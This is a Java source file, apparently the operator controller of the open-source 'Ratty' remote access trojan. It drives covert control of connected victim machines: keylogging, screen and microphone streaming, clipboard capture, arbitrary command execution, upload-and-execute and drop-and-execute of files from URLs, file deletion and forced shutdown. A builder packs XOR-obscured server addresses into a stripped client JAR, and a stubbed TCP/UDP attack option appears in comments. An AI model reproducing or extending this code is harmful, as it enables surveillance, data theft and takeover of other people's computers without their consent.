/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.gui;

import static de.sogomn.rat.util.Constants.LANGUAGE;

import java.awt.image.BufferedImage;
import java.net.URL;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Collection;
import java.util.HashMap;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.filechooser.FileFilter;
import javax.swing.filechooser.FileNameExtensionFilter;

import de.sogomn.engine.fx.Sound;
import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.gui.swing.ChatSwingGui;
import de.sogomn.rat.gui.swing.DisplayPanel;
import de.sogomn.rat.gui.swing.LoggingGui;
import de.sogomn.rat.gui.swing.Notification;
import de.sogomn.rat.packet.AudioPacket;
import de.sogomn.rat.packet.ChatPacket;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.ComputerInfoPacket;
import de.sogomn.rat.packet.DeleteFilePacket;
import de.sogomn.rat.packet.DesktopPacket;
import de.sogomn.rat.packet.DownloadFilePacket;
import de.sogomn.rat.packet.DownloadUrlPacket;
import de.sogomn.rat.packet.ExecuteFilePacket;
import de.sogomn.rat.packet.FileInformationPacket;
import de.sogomn.rat.packet.FileRequestPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.KeylogPacket;
import de.sogomn.rat.packet.NewDirectoryPacket;
import de.sogomn.rat.packet.PingPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.RestartPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.ShutdownPacket;
import de.sogomn.rat.packet.UninstallPacket;
import de.sogomn.rat.packet.UploadFilePacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.packet.WebsitePacket;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.util.FrameEncoder.Frame;
import de.sogomn.rat.util.JarBuilder;
import de.sogomn.rat.util.XorCipher;

/*
 * Woah, this is a huge class.
 * I know, I should have one controller for each GUI, but... You know... Nope.
 * There will a point where I gotta do all the refactoring. Damn that's gonna be fun.
 */
public final class RattyGuiController extends AbstractRattyController implements IGuiController {
	
	private IRattyGuiFactory guiFactory;
	private IRattyGui gui;
	private IBuilderGui builder;
	private IServerListGui serverList;
	
	private JFileChooser fileChooser;
	private Path selectedBuilderFile;
	
	private HashMap<ActiveConnection, ServerClient> clients;
	private long lastServerStart;
	
	private static final String BUILDER_DATA_REPLACEMENT = "data";
	private static final String BUILDER_DATA_REPLACEMENT_FORMAT = "%s:%s";
	private static final String BUILDER_MANIFEST_REPLACEMENT = "META-INF/MANIFEST.MF";
	private static final byte[] BUILDER_MANIFEST_REPLACEMENT_DATA = ("Manifest-Version: 1.0" + System.lineSeparator() + "Class-Path: ." + System.lineSeparator() + "Main-Class: de.sogomn.rat.RattyClient" + System.lineSeparator() + System.lineSeparator()).getBytes();
	private static final String[] BUILDER_REMOVALS = {
		"ping.wav",
		"lato.ttf",
		"gui_tree_icons.png",
		"gui_icon.png",
		"gui_menu_icons.png",
		"gui_category_icons.png",
		"gui_file_icons.png",
		"gui_notification_icons.png",
		"language/lang_bsq.properties",
		"language/lang_de.properties",
		"language/lang_en.properties",
		"language/lang_es.properties",
		"language/lang_nl.properties",
		"language/lang_ru.properties",
		"language/lang_tr.properties",
		"language/lang_uk.properties",
		"language/lang_pl.properties",
		"language/lang_dk.properties",
		"language/lang_it.properties",
		"language/lang_sv.properties",
		"language/lang_pt.properties",
		"language/lang_fr.properties",
		"language/lang_ro.properties",
		"language/lang_sr.properties",
		"language/lang_sr_Latn.properties",
		"de/sogomn/rat/RattyServer.class",
		"de/sogomn/rat/server/AbstractRattyController.class",
		"de/sogomn/rat/server/ActiveServer.class",
		"de/sogomn/rat/server/IServerObserver.class",
		"de/sogomn/rat/gui/server/IServerListGui.class",
		"de/sogomn/rat/gui/server/IRattyGui.class",
		"de/sogomn/rat/gui/server/IRattyGui.class",
		"de/sogomn/rat/gui/server/IServerListGui.class",
		"de/sogomn/rat/gui/server/IFileBrowserGui.class",
		"de/sogomn/rat/gui/server/FileBrowserSwingGui.class",
		"de/sogomn/rat/gui/server/IBuilderGui.class",
		"de/sogomn/rat/gui/server/IBuilderGui.class",
		"de/sogomn/rat/gui/server/ServerClient.class",
		"de/sogomn/rat/gui/server/ServerClientTableModel.class",
		"de/sogomn/rat/gui/server/RattyGuiController.class"
	};
	
	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
	private static final String UNINSTALL_WARNING = LANGUAGE.getString("server.uninstall_warning");
	private static final String YES = LANGUAGE.getString("server.yes");
	private static final String NO = LANGUAGE.getString("server.no");
	private static final String CANCEL = LANGUAGE.getString("server.cancel");
//	private static final String OPTION_TCP = LANGUAGE.getString("server.tcp");
//	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
//	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
	private static final String AMOUNT_QUESTION = LANGUAGE.getString("server.amount_question");
	private static final String FILE_NAME = LANGUAGE.getString("file_information.name");
	private static final String FILE_PATH = LANGUAGE.getString("file_information.path");
	private static final String FILE_SIZE = LANGUAGE.getString("file_information.size");
	private static final String FILE_DIRECTORY = LANGUAGE.getString("file_information.directory");
	private static final String FILE_CREATION = LANGUAGE.getString("file_information.creation");
	private static final String FILE_LAST_ACCESS = LANGUAGE.getString("file_information.last_access");
	private static final String FILE_LAST_MODIFICATION = LANGUAGE.getString("file_information.last_modification");
	private static final String FILE_BYTES = LANGUAGE.getString("file_information.bytes");
	private static final String USER_NAME = LANGUAGE.getString("information.user_name");
	private static final String HOST_NAME = LANGUAGE.getString("information.host_name");
	private static final String OS_NAME = LANGUAGE.getString("information.os_name");
	private static final String OS_ARCHITECTURE = LANGUAGE.getString("information.os_architecture");
	private static final String PROCESSORS = LANGUAGE.getString("information.processors");
	private static final String RAM = LANGUAGE.getString("information.ram");
	
	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
	private static final long PING_INTERVAL = 5000;
	private static final long NOTIFICATION_DELAY = 7500;
	
	private static final Sound PING = Sound.loadSound("/ping.wav");
	
	public RattyGuiController(final IRattyGuiFactory guiFactory) {
		this.guiFactory = guiFactory;
		
		final Thread pingThread = new Thread(() -> {
			while (true) {
				final PingPacket packet = new PingPacket();
				
				broadcast(packet);
				
				try {
					Thread.sleep(PING_INTERVAL);
				} catch (final Exception ex) {
					ex.printStackTrace();
				}
			}
		}, "Ping");
		
		gui = guiFactory.createRattyGui();
		builder = guiFactory.createBuilderGui();
		serverList = guiFactory.createServerListGui();
		fileChooser = new JFileChooser(".");
		clients = new HashMap<ActiveConnection, ServerClient>();
		
		serverList.addListener(this);
		builder.addListener(this);
		gui.addListener(this);
		gui.setVisible(true);
		
		pingThread.setPriority(Thread.MIN_PRIORITY);
		pingThread.setDaemon(true);
		pingThread.start();
	}
	
	public Path getFile(final String type) {
		final FileFilter filter;
		
		if (type != null) {
			filter = new FileNameExtensionFilter("*." + type, type);
		} else {
			filter = null;
		}
		
		fileChooser.setFileFilter(filter);
		
		final int input = fileChooser.showOpenDialog(null);
		
		if (input == JFileChooser.APPROVE_OPTION) {
			final Path file = fileChooser.getSelectedFile().toPath();
			
			return file;
		}
		
		return null;
	}
	
	public Path getFile() {
		return getFile(null);
	}
	
	public Path getSaveFile() {
		final int input = fileChooser.showSaveDialog(null);
		
		if (input == JFileChooser.APPROVE_OPTION) {
			final Path file = fileChooser.getSelectedFile().toPath();
			
			return file;
		}
		
		return null;
	}
	
	public Path getSaveFile(final String type) {
		Path file = getSaveFile();
		
		if (file == null) {
			return null;
		}
		
		final String path = file.toString().toLowerCase();
		final String suffix = "." + type.toLowerCase();
		
		if (!path.endsWith(suffix)) {
			file = Paths.get(path + suffix);
		}
		
		return file;
	}
	
	/*
	 * ==================================================
	 * HANDLING COMMANDS
	 * ==================================================
	 */
	
	private PopupPacket createPopupPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final PopupPacket packet = new PopupPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private CommandPacket createCommandPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private WebsitePacket createWebsitePacket() {
		final String input = gui.getInput(URL_MESSAGE);
		
		if (input == null) {
			return null;
		}
		
		final String numberInput = gui.getInput(AMOUNT_QUESTION);
		final int number;
		
		try {
			number = Integer.parseInt(numberInput);
		} catch (final NumberFormatException ex) {
			return null;
		}
		
		final WebsitePacket packet = new WebsitePacket(input, number);
		
		return packet;
	}
	
	private AudioPacket createAudioPacket() {
		final Path file = getFile("WAV");
		final AudioPacket packet = new AudioPacket(file);
		
		return packet;
	}
	
	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
		final String path = "";//TODO
		final DownloadFilePacket packet = new DownloadFilePacket(path);
		
		return packet;
	}
	
	private UploadFilePacket createUploadPacket(final ServerClient client) {
		final Path file = getFile();
		final byte[] data = FileUtils.readExternalData(file);
		
		if (file != null) {
			final String path = "";//TODO
			final UploadFilePacket packet = new UploadFilePacket(path, data);
			
			return packet;
		}
		
		return null;
	}
	
	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
		final String path = "";//TODO
		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
		
		return packet;
	}
	
	private DeleteFilePacket createDeletePacket(final ServerClient client) {
		final String path = "";//TODO
		final DeleteFilePacket packet = new DeleteFilePacket(path);
		
		return packet;
	}
	
	private NewDirectoryPacket createDirectoryPacket(final ServerClient client) {
		final String input = gui.getInput();
		
		if (input != null) {
			final String path = "";//TODO
			final NewDirectoryPacket packet = new NewDirectoryPacket(path, input);
			
			return packet;
		}
		
		return null;
	}
	
	private FreePacket createFreePacket() {
		final int input = gui.showWarning(FREE_WARNING, YES, CANCEL);
		
		if (input == JOptionPane.YES_OPTION) {
			final FreePacket packet = new FreePacket();
			
			return packet;
		}
		
		return null;
	}
	
	private DownloadUrlPacket createDownloadUrlPacket(final ServerClient client) {
		final String address = gui.getInput(URL_MESSAGE);
		
		if (address != null) {
			final String path = "";//TODO
			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
			
			return packet;
		}
		
		return null;
	}
	
	private FileInformationPacket createFileInformationPacket(final ServerClient client) {
		final String path = "";//TODO
		final FileInformationPacket packet = new FileInformationPacket(path);
		
		return packet;
	}
	
	private UploadFilePacket createUploadExecutePacket(final ServerClient client) {
		final String path = "";//TODO
		final Path file = getFile();
		final byte[] data = FileUtils.readExternalData(file);
		
		if (file != null) {
			final UploadFilePacket packet = new UploadFilePacket(path, data, true);
			
			return packet;
		}
		
		return null;
	}
	
	private DownloadUrlPacket createDropExecutePacket(final ServerClient client) {
		final String address = gui.getInput(URL_MESSAGE);
		
		if (address != null) {
			final DownloadUrlPacket packet = new DownloadUrlPacket(address, "", true);
			
			return packet;
		}
		
		return null;
	}
	
	private ChatPacket createChatPacket(final ServerClient client) {
		final String message = client.chat.getMessageInput();
		final ChatPacket packet = new ChatPacket(message);
		
		return packet;
	}
	
	private UninstallPacket createUninstallPacket() {
		final int input = gui.showWarning(UNINSTALL_WARNING, YES, CANCEL);
		
		if (input == JOptionPane.YES_OPTION) {
			final UninstallPacket packet = new UninstallPacket();
			
			return packet;
		}
		
		return null;
	}
	
	private void toggleDesktopStream(final ServerClient client) {
		final boolean streamingDesktop = client.isStreamingDesktop();
		
		client.setStreamingDesktop(!streamingDesktop);
		gui.update();
	}
	
	private void stopDesktopStream(final ServerClient client) {
		client.setStreamingDesktop(false);
		gui.update();
	}
	
	private void toggleVoiceStream(final ServerClient client) {
		final boolean streamingVoice = client.isStreamingVoice();
		
		client.setStreamingVoice(!streamingVoice);
		gui.update();
	}
	
	private void requestFile(final ServerClient client) {
		final String path = "";//TODO
		final FileRequestPacket packet = new FileRequestPacket(path);
		
		client.connection.addPacket(packet);
	}
	
	private void launchAttack() {
		gui.showMessage("Not implemented yet");//TODO
		
//		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, CANCEL);
//		
//		final AttackPacket packet = null;
//		
//		if (input == JOptionPane.YES_OPTION) {
//			//packet = new AttackPacket(AttackPacket.TCP, address, port, duration);
//		} else if (input == JOptionPane.NO_OPTION) {
//			//packet = new AttackPacket(AttackPacket.UDP, address, port, duration);
//		} else {
//			return;
//		}
//		
//		broadcast(packet);
	}
	
	private void build() {
		final String[] entries = builder.getListEntries();
		
		if (selectedBuilderFile == null || entries.length == 0) {
			return;
		}
		
		final String dataReplacementString = Stream.of(entries).collect(Collectors.joining("\r\n"));
		final byte[] dataReplacement = dataReplacementString.getBytes();
		
		XorCipher.crypt(dataReplacement);
		
		final JarBuilder jarBuilder = new JarBuilder(selectedBuilderFile);
		
		jarBuilder.replaceFile(BUILDER_DATA_REPLACEMENT, dataReplacement);
		jarBuilder.replaceFile(BUILDER_MANIFEST_REPLACEMENT, BUILDER_MANIFEST_REPLACEMENT_DATA);
		jarBuilder.removeFiles(BUILDER_REMOVALS);
		
		try {
			jarBuilder.build();
		} catch (final Exception ex) {
			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex);
		}
		
		builder.clearListEntries();
		builder.setVisible(false);
	}
	
	private void selectBuilderFile() {
		selectedBuilderFile = getSaveFile("JAR");
		
		if (selectedBuilderFile != null) {
			final String name = selectedBuilderFile.getFileName().toString();
			
			builder.setFileName(name);
		} else {
			builder.setFileName(IBuilderGui.NO_FILE);
		}
	}
	
	private void addBuilderEntry() {
		final String address = builder.getAddressInput();
		final String port = builder.getPortInput();
		
		if (address == null || port == null || address.isEmpty() || port.isEmpty()) {
			return;
		}
		
		final String entry = String.format(BUILDER_DATA_REPLACEMENT_FORMAT, address, port);
		
		builder.addListEntry(entry);
		builder.setAddressInput("");
		builder.setPortInput("");
	}
	
	private void removeBuilderEntry() {
		final String selectedEntry = builder.getSelectedListEntry();
		
		builder.removeListEntry(selectedEntry);
	}
	
	private void exit() {
		final Collection<ServerClient> clientSet = clients.values();
		
		for (final ServerClient client : clientSet) {
			client.removeAllListeners();
			client.logOut();
		}
		
		clients.clear();
		
		for (final ActiveConnection connection : connections) {
			connection.setObserver(null);
			connection.close();
		}
		
		connections.clear();
		
		for (final ActiveServer server : servers) {
			server.setObserver(null);
			server.close();
		}
		
		serverList.removeAllListeners();
		serverList.close();
		builder.removeAllListeners();
		builder.close();
		gui.removeAllListeners();
		gui.close();
		servers.clear();
		
		System.exit(0);
	}
	
	private void startServer() {
		final String portString = serverList.getPortInput();
		
		try {
			final int port = Integer.parseInt(portString);
			
			/*65535 = Max port*/
			if (port <= 0 || port > 65535) {
				return;
			}
			
			startServer(port);
		} catch (final Exception ex) {
			//...
		}
	}
	
	private void stopServer() {
		final String portString = serverList.getSelectedItem();
		
		try {
			final int port = Integer.parseInt(portString);
			
			stopServer(port);
		} catch (final Exception ex) {
			//...
		}
	}
	
	private void handleCommand(final ServerClient client, final String command) {
		if (command == IRattyGui.FILES) {
			client.fileBrowser.setVisible(true);
		} else if (command == DisplayPanel.CLOSED) {
			stopDesktopStream(client);
		} else if (command == IRattyGui.DESKTOP) {
			toggleDesktopStream(client);
		} else if (command == IRattyGui.VOICE) {
			toggleVoiceStream(client);
		} else if (command == IFileBrowserGui.REQUEST) {
			requestFile(client);
		} else if (command == IRattyGui.CHAT) {
			client.chat.setVisible(true);
		} else if (command == IRattyGui.KEYLOG) {
			client.logger.setVisible(true);
		} else if (command == LoggingGui.CLEAR) {
			client.logger.clear();
		}
	}
	
	private void handleGlobalCommand(final String command) {
		if (command == IRattyGui.CLOSE) {
			exit();
		} else if (command == IRattyGui.BUILD) {
			builder.setVisible(true);
		} else if (command == IBuilderGui.CHOOSE) {
			selectBuilderFile();
		} else if (command == IBuilderGui.BUILD) {
			build();
		} else if (command == IRattyGui.ATTACK) {
			launchAttack();
		} else if (command == IBuilderGui.ADD) {
			addBuilderEntry();
		} else if (command == IBuilderGui.REMOVE) {
			removeBuilderEntry();
		} else if (command == IRattyGui.MANAGE_SERVERS) {
			serverList.setVisible(true);
		} else if (command == IServerListGui.START) {
			startServer();
		} else if (command == IServerListGui.STOP) {
			stopServer();
		}
	}
	
	private IPacket createPacket(final ServerClient client, final String command) {
		IPacket packet = null;
		
		if (command == IRattyGui.FREE) {
			packet = createFreePacket();
		} else if (command == IRattyGui.POPUP) {
			packet = createPopupPacket();
		} else if (command == IRattyGui.CLIPBOARD) {
			packet = new ClipboardPacket();
		} else if (command == IRattyGui.COMMAND) {
			packet = createCommandPacket();
		} else if (command == IRattyGui.SCREENSHOT) {
			packet = new ScreenshotPacket();
		} else if (command == IRattyGui.WEBSITE) {
			packet = createWebsitePacket();
		} else if (command == IRattyGui.DESKTOP) {
			packet = new DesktopPacket(true);
		} else if (command == IRattyGui.AUDIO) {
			packet = createAudioPacket();
		} else if (command == IFileBrowserGui.DOWNLOAD) {
			packet = createDownloadPacket(client);
		} else if (command == IFileBrowserGui.UPLOAD) {
			packet = createUploadPacket(client);
		} else if (command == IFileBrowserGui.EXECUTE) {
			packet = createExecutePacket(client);
		} else if (command == IFileBrowserGui.DELETE) {
			packet = createDeletePacket(client);
		} else if (command == IFileBrowserGui.NEW_DIRECTORY) {
			packet = createDirectoryPacket(client);
		} else if (command == IFileBrowserGui.DROP_FILE) {
			packet = createDownloadUrlPacket(client);
		} else if (command == IRattyGui.UPLOAD_EXECUTE) {
			packet = createUploadExecutePacket(client);
		} else if (command == IRattyGui.DROP_EXECUTE) {
			packet = createDropExecutePacket(client);
		} else if (command == ChatSwingGui.MESSAGE_SENT) {
			packet = createChatPacket(client);
		} else if (command == IFileBrowserGui.INFORMATION) {
			packet = createFileInformationPacket(client);
		} else if (command == IRattyGui.INFORMATION) {
			packet = new ComputerInfoPacket();
		} else if (command == IRattyGui.UNINSTALL) {
			packet = createUninstallPacket();
		} else if (command == IRattyGui.SHUT_DOWN) {
			packet = new ShutdownPacket();
		} else if (command == DisplayPanel.MOUSE_EVENT && client.isStreamingDesktop()) {
			packet = client.displayPanel.getLastMouseEventPacket();
		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
			packet = client.displayPanel.getLastKeyEventPacket();
		} else if (command == IRattyGui.VOICE && !client.isStreamingVoice()) {
			packet = new VoicePacket();
		} else if (command == IRattyGui.RESTART) {
			packet = new RestartPacket();
		}
		
		return packet;
	}
	
	/*
	 * ==================================================
	 * HANDLING PACKETS
	 * ==================================================
	 */
	
	private void showScreenshot(final ServerClient client, final ScreenshotPacket packet) {
		final BufferedImage image = packet.getImage();
		
		client.displayPanel.showImage(image);
	}
	
	private void handleFiles(final ServerClient client, final FileRequestPacket packet) {
		//TODO
	}
	
	private void handleDesktopPacket(final ServerClient client, final DesktopPacket packet) {
		if (!client.isStreamingDesktop()) {
			return;
		}
		
		final Frame[] frames = packet.getFrames();
		final int screenWidth = packet.getScreenWidth();
		final int screenHeight = packet.getScreenHeight();
		final DesktopPacket request = new DesktopPacket();
		
		client.connection.addPacket(request);
		client.displayPanel.showFrames(frames, screenWidth, screenHeight);
	}
	
	private void handleClipboardPacket(final ClipboardPacket packet) {
		final String message = packet.getClipbordContent();
		
		gui.showMessage(message);
	}
	
	private void handleVoicePacket(final ServerClient client, final VoicePacket packet) {
		if (!client.isStreamingVoice()) {
			return;
		}
		
		final Sound sound = packet.getSound();
		final VoicePacket request = new VoicePacket();
		
		client.connection.addPacket(request);
		sound.play();
	}
	
	private void handlePing(final ServerClient client, final PingPacket packet) {
		final long milliseconds = packet.getMilliseconds();
		
		client.setPing(milliseconds);
		gui.update();
	}
	
	private void handleChatPacket(final ServerClient client, final ChatPacket packet) {
		final String message = packet.getMessage();
		final String name = client.getName();
		
		client.chat.appendLine(name + ": " + message);
	}
	
	private void handleFileInformation(final ServerClient client, final FileInformationPacket packet) {
		final String name = packet.getName();
		final String path = packet.getPath();
		final long size = packet.getSize();
		final boolean directory = packet.isDirectory();
		final long creationTime = packet.getCreationTime();
		final long lastAccess = packet.getLastAccess();
		final long lastModified = packet.getLastModified();
		final SimpleDateFormat dateFormat = new SimpleDateFormat();
		final String creationDate = dateFormat.format(creationTime);
		final String lastAccessDate = dateFormat.format(lastAccess);
		final String lastModificationDate = dateFormat.format(lastModified);
		final String directoryString = directory ? YES : NO;
		final StringBuilder builder = new StringBuilder();
		final String message = builder
				.append(FILE_NAME).append(": ").append(name).append("\r\n")
				.append(FILE_PATH).append(": ").append(path).append("\r\n")
				.append(FILE_SIZE).append(": ").append(size).append(" ").append(FILE_BYTES).append("\r\n")
				.append(FILE_DIRECTORY).append(": ").append(directoryString).append("\r\n")
				.append(FILE_CREATION).append(": ").append(creationDate).append("\r\n")
				.append(FILE_LAST_ACCESS).append(": ").append(lastAccessDate).append("\r\n")
				.append(FILE_LAST_MODIFICATION).append(": ").append(lastModificationDate)
				.toString();
		
		gui.showMessage(message);
	}
	
	private void handleInfoPacket(final ComputerInfoPacket packet) {
		final String name = packet.getName();
		final String hostName = packet.getHostName();
		final String os = packet.getOs();
		final String osVersion = packet.getOsVersion();
		final String osArchitecture = packet.getOsArchitecture();
		final int processors = packet.getProcessors();
		final long ram = packet.getRam();
		final StringBuilder builder = new StringBuilder();
		
		final String message = builder
				.append(USER_NAME).append(": ").append(name).append("\r\n")
				.append(HOST_NAME).append(": ").append(hostName).append("\r\n")
				.append(OS_NAME).append(": ").append(os).append(" ").append(osVersion).append("\r\n")
				.append(OS_ARCHITECTURE).append(": ").append(osArchitecture).append("\r\n")
				.append(PROCESSORS).append(": ").append(processors).append("\r\n")
				.append(RAM).append(": ").append(ram).append(" ").append(FILE_BYTES).append("\r\n")
				.toString();
		
		gui.showMessage(message);
	}
	
	private void handleKeylog(final ServerClient client, final KeylogPacket packet) {
		final int keyCode = packet.getKeyCode();
		
		client.logger.log(keyCode);
	}
	
	private boolean handlePacket(final ServerClient client, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		boolean consumed = true;
		
		if (clazz == ScreenshotPacket.class) {
			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
			
			showScreenshot(client, screenshot);
		} else if (clazz == FileRequestPacket.class) {
			final FileRequestPacket request = (FileRequestPacket)packet;
			
			handleFiles(client, request);
		} else if (clazz == DesktopPacket.class) {
			final DesktopPacket desktop = (DesktopPacket)packet;
			
			handleDesktopPacket(client, desktop);
		} else if (clazz == ClipboardPacket.class) {
			final ClipboardPacket clipboard = (ClipboardPacket)packet;
			
			handleClipboardPacket(clipboard);
		} else if (clazz == VoicePacket.class) {
			final VoicePacket voice = (VoicePacket)packet;
			
			handleVoicePacket(client, voice);
		} else if (clazz == PingPacket.class) {
			final PingPacket ping = (PingPacket)packet;
			
			handlePing(client, ping);
		} else if (clazz == ChatPacket.class) {
			final ChatPacket chat = (ChatPacket)packet;
			
			handleChatPacket(client, chat);
		} else if (clazz == ComputerInfoPacket.class) {
			final ComputerInfoPacket info = (ComputerInfoPacket)packet;
			
			handleInfoPacket(info);
		} else if (clazz == FileInformationPacket.class) {
			final FileInformationPacket information = (FileInformationPacket)packet;
			
			handleFileInformation(client, information);
		} else if (clazz == KeylogPacket.class) {
			final KeylogPacket log = (KeylogPacket)packet;
			
			handleKeylog(client, log);
		} else if (clazz == FreePacket.class || clazz == ShutdownPacket.class) {
			//To prevent them from executing
		} else {
			consumed = false;
		}
		
		return consumed;
	}
	
	/*
	 * ==================================================
	 * HANDLING END
	 * ==================================================
	 */
	
	private ImageIcon getFlagIcon(final String address) {
		try {
			final String requestAddress = FLAG_ADDRESS + address;
			final URL url = new URL(requestAddress);
			final BufferedImage image = ImageIO.read(url);
			final ImageIcon icon = new ImageIcon(image);
			
			return icon;
		} catch (final Exception ex) {
			return null;
		}
	}
	
	private void logIn(final ServerClient client, final InformationPacket packet) {
		final String name = packet.getName();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		final String address = client.getAddress();
		final ImageIcon icon = getFlagIcon(address);
		final boolean shouldNotify = System.currentTimeMillis() - lastServerStart > NOTIFICATION_DELAY;
		
		client.logIn(name, os, version, icon);
		client.addListener(this);
		
		gui.addClient(client);
		gui.update();
		
		if (shouldNotify) {
			final Notification notification = new Notification(name + " " + address, icon);
			
			notification.trigger();
			PING.play();
		}
	}
	
	@Override
	public void startServer(final int port) {
		final String portString = String.valueOf(port);
		final boolean contains = serverList.containsListEntry(portString);
		
		super.startServer(port);
		
		if (!contains) {
			serverList.addListEntry(portString);
			serverList.setPortInput("");
			
			lastServerStart = System.currentTimeMillis();
		}
	}
	
	@Override
	public void stopServer(final int port) {
		final String portString = String.valueOf(port);
		
		super.stopServer(port);
		
		serverList.removeListEntry(portString);
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		
		if (client == null) {
			return;
		}
		
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			final boolean consumed = handlePacket(client, packet);
			
			if (!consumed) {
				packet.execute(connection);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		super.connected(server, connection);
		
		final ServerClient client = new ServerClient(connection, guiFactory);
		
		clients.put(connection, client);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		super.disconnected(connection);
		
		final ServerClient client = getClient(connection);
		
		if (client == null) {
			return;
		}
		
		client.logOut();
		
		gui.removeClient(client);
		clients.remove(connection);
		
		client.removeListener(this);
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		final int port = server.getPort();
		final String portString = String.valueOf(port);
		
		super.closed(server);
		
		serverList.removeListEntry(portString);
	}
	
	@Override
	public void userInput(final String command, final Object source) {
		final ServerClient client;
		
		if (source instanceof ServerClient) {
			client = (ServerClient)source;
		} else if (source instanceof IRattyGui) {
			final IRattyGui gui = (IRattyGui)source;
			
			client = gui.getSelectedClient();
		} else {
			client = null;
		}
		
		if (client != null) {
			final IPacket packet = createPacket(client, command);
			
			if (packet != null) {
				client.connection.addPacket(packet);
			}
			
			handleCommand(client, command);
		}
		
		handleGlobalCommand(command);
	}
	
	public final ServerClient getClient(final ActiveConnection searched) {
		final Set<ActiveConnection> clientSet = clients.keySet();
		
		for (final ActiveConnection connection : clientSet) {
			if (connection == searched) {
				final ServerClient client = clients.get(connection);
				
				return client;
			}
		}
		
		return null;
	}
	
}